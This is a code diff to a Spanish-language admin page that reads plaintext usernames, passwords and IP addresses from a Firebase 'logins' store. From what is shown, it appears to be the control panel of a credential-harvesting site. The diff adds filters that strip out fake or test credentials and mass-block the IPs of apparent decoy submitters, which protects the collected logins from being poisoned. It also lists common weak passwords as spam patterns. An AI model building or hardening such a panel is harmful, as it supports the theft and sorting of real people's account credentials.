@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel con Anti-Spam + Control IPs</title>
+    <title>Panel - Protección Anti-Ataque</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -20,12 +20,15 @@
         .btn-orange { background: #f97316; color: white; }
         .btn-green { background: #10b981; color: white; }
         .btn-amber { background: #f59e0b; color: black; }
+        .btn-dark { background: #1e293b; border: 1px solid #ef4444; color: #ef4444; }
         .badge { padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: bold; }
         .badge-red { background: #dc2626; color: white; }
         .badge-amber { background: #f59e0b; color: black; }
         .badge-green { background: #10b981; color: white; }
         #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
         #panel-content { display: none; }
+        .alerta-ataque { background: linear-gradient(90deg, #dc2626, #991b1b); border: 2px solid #fca5a5; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
     </style>
 </head>
 <body class="p-4">
@@ -46,13 +49,21 @@
         <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
             <div>
                 <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
-                <p class="text-slate-500 text-xs">Anti-Spam + Control de IPs</p>
+                <p class="text-slate-500 text-xs">Protección contra ataques directos</p>
             </div>
             <div class="flex items-center gap-4">
                 <button onclick="cambiarVista('ips')" class="btn btn-amber">📊 IPs</button>
                 <button onclick="cambiarVista('blacklist')" class="btn btn-red">🚫 Bloqueadas</button>
                 <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
             </div>
+        </div>
+
+        <!-- ALERTA DE ATAQUE -->
+        <div id="alerta-ataque" class="hidden mb-4 alerta-ataque p-4 rounded-xl">
+            <p class="text-white font-bold text-center">
+                <i class="fa-solid fa-triangle-exclamation"></i> 
+                DETECTADO ATAQUE DIRECTO A FIREBASE - <span id="contador-ataques">0</span> REGISTROS BLOQUEADOS
+            </p>
         </div>
 
         <!-- STATS -->
@@ -65,10 +76,20 @@
         </div>
 
         <!-- BOTONES -->
-        <div class="flex gap-2 mb-4 flex-wrap">
+        <div class="flex gap-2 mb-4 flex-wrap items-center">
             <button onclick="cambiarVista('validos')" class="btn btn-green">✓ Registros</button>
             <button onclick="cambiarVista('spam')" class="btn btn-red">🗑 Papelera</button>
             <button onclick="cambiarVista('todos')" class="btn btn-blue">Todos</button>
+            <div class="w-px h-8 bg-slate-700 mx-2"></div>
+            <button onclick="limpiarTests()" class="btn btn-dark text-red-400 border-red-500 hover:bg-red-900/30">
+                <i class="fa-solid fa-broom"></i> Limpiar Tests
+            </button>
+            <button onclick="limpiarTodoSpam()" class="btn btn-red">
+                <i class="fa-solid fa-trash"></i> Vaciar Papelera
+            </button>
+            <button onclick="bloquearIPsMasivas()" class="btn btn-amber">
+                <i class="fa-solid fa-shield-halved"></i> Bloquear IPs +10 intentos
+            </button>
         </div>
 
         <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
@@ -80,24 +101,42 @@
         let vistaActual = 'validos';
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
+        let ataquesDetectados = 0;
 
-        // ANTI-SPAM RESTRINGIDO
+        // ANTI-SPAM ULTRA RESTRINGIDO (contra ataques directos)
         function esSpam(id, data) {
-            if (!data || !data.user || !data.pass) return true;
+            if (!data || typeof data !== 'object') return true;
+            if (!data.user || !data.pass) return true;
             
-            // IDs de prueba
-            const spamIds = ['test', 'prueba', 'admin', 'demo', 'fake', 'id-test'];
-            if (spamIds.some(s => id.toLowerCase().includes(s))) return true;
+            // IDs de prueba (detecta test-001, test_002, TEST-123, etc.)
+            const idLower = id.toLowerCase();
+            const spamPatterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'ejemplo', 'sample', 'user', 'pass', 'login'];
+            if (spamPatterns.some(s => idLower.includes(s))) {
+                ataquesDetectados++;
+                return true;
+            }
             
             // Usuarios de prueba
-            const spamUsers = ['test', 'prueba', 'admin', 'usuario1', 'usuario2', 'usuario3', 'usuario4', 'usuario5', 'usuario6', 'usuario7', 'usuario8'];
             const userLower = (data.user || '').toLowerCase();
-            if (spamUsers.includes(userLower)) return true;
+            const spamUsers = ['test', 'prueba', 'admin', 'demo', 'usuario1', 'usuario2', 'usuario3', 'usuario4', 'usuario5', 
+                             'user1', 'user2', 'user3', 'pass', 'password', '123456', 'qwerty'];
+            if (spamUsers.includes(userLower)) {
+                ataquesDetectados++;
+                return true;
+            }
             
             // Contraseñas de prueba
-            const spamPasses = ['test', 'prueba', 'admin', '123', 'clave1', 'clave2', 'clave3', 'clave4', 'clave5'];
             const passLower = (data.pass || '').toLowerCase();
-            if (spamPasses.includes(passLower)) return true;
+            const spamPasses = ['test', 'prueba', 'admin', 'demo', '123', 'clave1', 'clave2', 'clave3', 'password', 'pass', 
+                              '123456', 'qwerty', '111111', '000000'];
+            if (spamPasses.includes(passLower)) {
+                ataquesDetectados++;
+                return true;
+            }
+            
+            // Datos sospechosos (muy cortos o muy largos)
+            if (data.user.length < 3 || data.user.length > 50) return true;
+            if (data.pass.length < 3 || data.pass.length > 100) return true;
             
             // IP bloqueada
             if (data.ip && datos.blacklist[data.ip]) return true;
@@ -135,13 +174,27 @@
             if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
             db = firebase.database();
 
+            // Escuchar logins con auto-limpieza de spam
             db.ref('logins').on('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
+                ataquesDetectados = 0;
                 
                 snap.forEach((child) => {
                     const data = child.val();
                     const id = child.key;
+                    
+                    // Auto-eliminar si es spam (ataque directo)
+                    if (esSpam(id, data)) {
+                        db.ref('spam/' + id).set({
+                            ...data,
+                            deletedAt: Date.now(),
+                            reason: 'auto_spam',
+                            originalId: id
+                        });
+                        db.ref('logins/' + id).remove();
+                        return;
+                    }
                     
                     if (data.ip && data.ip !== 'unknown') {
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
@@ -151,6 +204,15 @@
                 });
                 
                 datos.validos = validos;
+                
+                // Mostrar alerta si hay ataques
+                if (ataquesDetectados > 0) {
+                    document.getElementById('alerta-ataque').classList.remove('hidden');
+                    document.getElementById('contador-ataques').textContent = ataquesDetectados;
+                } else {
+                    document.getElementById('alerta-ataque').classList.add('hidden');
+                }
+                
                 renderizar();
             });
 
@@ -173,6 +235,49 @@
         function cambiarVista(vista) {
             vistaActual = vista;
             renderizar();
+        }
+
+        // FUNCIONES DE LIMPIEZA MASIVA
+        function limpiarTests() {
+            if(!confirm('🧹 ¿Eliminar TODOS los registros que contengan "test", "prueba", "admin", "demo"?')) return;
+            
+            let eliminados = 0;
+            const patterns = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass'];
+            
+            datos.validos.forEach(({id, data}) => {
+                if(patterns.some(p => id.toLowerCase().includes(p) || 
+                    (data.user && data.user.toLowerCase().includes(p)) ||
+                    (data.pass && data.pass.toLowerCase().includes(p)))) {
+                    db.ref('spam/' + id).set({...data, cleaned: true});
+                    db.ref('logins/' + id).remove();
+                    eliminados++;
+                }
+            });
+            
+            alert(`🗑 Eliminados ${eliminados} registros de prueba/ataque`);
+        }
+
+        function limpiarTodoSpam() {
+            if(!confirm('⚠️ ¿Vaciar COMPLETAMENTE la papelera?')) return;
+            
+            db.ref('spam').remove().then(() => {
+                alert('🗑 Papelera vaciada');
+            });
+        }
+
+        function bloquearIPsMasivas() {
+            if(!confirm('🚫 ¿Bloquear todas las IPs con 10+ intentos?')) return;
+            
+            let bloqueadas = 0;
+            for (const [ip, count] of Object.entries(contadorIPs)) {
+                if (count >= 10 && !datos.blacklist[ip]) {
+                    const ipKey = ip.replace(/\./g, '_');
+                    db.ref('blacklist/' + ipKey).set({ ip, since: Date.now(), count });
+                    bloqueadas++;
+                }
+            }
+            
+            alert(`🚫 Bloqueadas ${bloqueadas} IPs`);
         }
 
         function renderizar() {
@@ -298,12 +403,12 @@
             }
 
             let html = '<div class="col-span-3 bg-red-900/20 border border-red-500 p-6 rounded-xl">';
-            html += '<h3 class="text-xl font-bold mb-4 text-red-400">🚫 IPs Bloqueadas</h3>';
+            html += '<h3 class="text-xl font-bold mb-4 text-red-400">🚫 IPs Bloqueadas Permanentemente</h3>';
             html += '<table class="w-full text-left">';
-            html += '<tr class="text-red-300 text-xs border-b border-red-700"><th>IP</th><th>Desde</th><th>Acción</th></tr>';
+            html += '<tr class="text-red-300 text-xs border-b border-red-700"><th>IP</th><th>Intentos</th><th>Desde</th><th>Acción</th></tr>';
             
             ipsBloqueadas.forEach(([ip, info]) => {
-                html += `<tr class="border-b border-red-700/30"><td class="py-3 font-mono text-red-200">${ip}</td><td class="py-3 text-sm text-red-300">${info.since ? new Date(info.since).toLocaleString() : 'N/A'}</td><td class="py-3"><button onclick="toggleBlockIP('${ip}')" class="btn btn-green" style="padding: 4px 12px;">Desbloquear</button></td></tr>`;
+                html += `<tr class="border-b border-red-700/30"><td class="py-3 font-mono text-red-200">${info.ip || ip}</td><td class="py-3 text-sm">${info.count || 'N/A'}</td><td class="py-3 text-sm text-red-300">${info.since ? new Date(info.since).toLocaleString() : 'N/A'}</td><td class="py-3"><button onclick="toggleBlockIP('${info.ip || ip}')" class="btn btn-green" style="padding: 4px 12px;">Desbloquear</button></td></tr>`;
             });
             
             html += '</table></div>';
@@ -321,7 +426,7 @@
             } else {
                 if (confirm(`¿Bloquear PERMANENTEMENTE ${ip}?`)) {
                     const ipKey = ip.replace(/\./g, '_');
-                    db.ref('blacklist/' + ipKey).set({ ip: ip, since: Date.now() });
+                    db.ref('blacklist/' + ipKey).set({ ip: ip, since: Date.now(), count: contadorIPs[ip] || 1 });
                     
                     datos.validos.forEach(({id, data}) => {
                         if (data.ip === ip) {
